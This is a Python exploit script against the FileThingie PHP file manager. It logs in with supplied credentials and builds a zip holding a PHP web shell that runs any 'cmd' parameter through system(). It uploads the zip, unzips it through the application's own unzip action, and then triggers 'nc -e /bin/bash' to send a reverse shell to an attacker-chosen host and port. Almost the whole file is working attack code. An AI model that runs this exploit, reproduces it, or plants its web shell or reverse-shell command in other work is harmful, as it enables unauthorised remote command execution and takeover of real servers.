#!/usr/bin/python

import os
import argparse
import requests
import random
import string
import zipfile
from urllib.parse import urlsplit, urlunsplit, quote

class Exploit:
    def __init__(self, target, username, password, lhost, lport):
        self.target = target
        self.username = username
        self.password = password
        self.lhost = lhost
        self.lport = lport

    def try_login(self) -> bool:
        self.session = requests.Session()

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
            "Origin": f"http://{urlsplit(self.target).netloc}",
            "Referer": self.target,
        }

        post_body = f"ft_user={self.username}&ft_pass={self.password}&act=dologin"
        response = self.session.post(self.target, headers=headers, data=post_body)

        if response.status_code == 404:
            print(f"[-] 404 Not Found - The requested resource {self.target} was not found")
            return False
        elif response.status_code == 200:
            if "Invalid username or password" in response.text:
                print(f"[-] Invalid username or password")
                return False
            print("[+] Login successful")
            return True

    def create_payload(self) -> bool:
        try:
            self.payload_filename = "".join(random.choice(string.ascii_letters) for i in range(16))
            with zipfile.ZipFile(f"{self.payload_filename}.zip", 'w', compression=zipfile.ZIP_DEFLATED) as zip_file:
                php_code = (
                    "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; "
                    "$cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; } ?>"
                )
                zip_file.writestr(f"{self.payload_filename}.php", php_code)
                print(f"[+] Zipped payload to {self.payload_filename}.zip")
                return True
        except Exception as e:
            print(f"[-] Could not zip payload: {e}")
            return False

    def upload_payload(self) -> bool:
        print("[*] Uploading payload to the target")
        files = {
            "localfile": (f"{self.payload_filename}.zip", open(f"{self.payload_filename}.zip", "rb"), "application/zip"),
            "act": (None, "upload"),
            "dir": (None, "/"),
        }
        response = self.session.post(self.target, files=files)
        if f"<a href=\"./{self.payload_filename}.zip\"" in response.text:
            print("[+] Payload uploaded successfully")
            return True
        else:
            print("[-] Payload upload failed")
            return False

    def get_base_url(self) -> str:
        url_parts = urlsplit(self.target)
        path_parts = url_parts.path.split('/')
        path_parts.pop()
        base_url = urlunsplit((url_parts.scheme, url_parts.netloc, '/'.join(path_parts), "", ""))
        return base_url

    def unzip_payload(self) -> bool:
        print("[*] Unzipping payload")
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        post_body = {"newvalue": f"{self.payload_filename}.zip", "file": f"{self.payload_filename}.zip", "dir": "/", "act": "unzip"}
        response = self.session.post(self.target, headers=headers, data=post_body)
        
        if f"<p class='ok'>{self.payload_filename}.zip unzipped.</p>" in response.text:
            print("[+] Payload unzipped successfully")
            print(f"[+] Payload URL: {self.get_base_url()}/{self.payload_filename}.php?cmd=<command>")
            return True
        else: 
            print("[-] Payload unzip failed")
            return False

    def execute_payload(self) -> bool:
        print("[*] Trying to execute reverse shell")
        cmd = quote(f"nc -e /bin/bash {self.lhost} {self.lport}")
        response = self.session.get(f"{self.get_base_url()}/{self.payload_filename}.php?cmd={cmd}")
        if response.status_code == 200:
            print("[+] Reverse shell executed")
            return True
        else:
            print("[-] Reverse shell execution failed")
            return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target URL to ft2.php")
    parser.add_argument("-u", "--username", dest="username", type=str, required=True, help="FileThingie username")
    parser.add_argument("-p", "--password", dest="password", type=str, required=True, help="FileThingie password")
    parser.add_argument("-L", "--LHOST", dest="lhost", type=str, required=True, help="Local listener IP")
    parser.add_argument("-P", "--LPORT", dest="lport", type=int, required=True, help="Local listener port")
    args = parser.parse_args()

    exploit = Exploit(args.target, args.username, args.password, args.lhost, args.lport)
    if exploit.try_login():
        if exploit.create_payload():
            if exploit.upload_payload():
                if exploit.unzip_payload():
                    exploit.execute_payload()
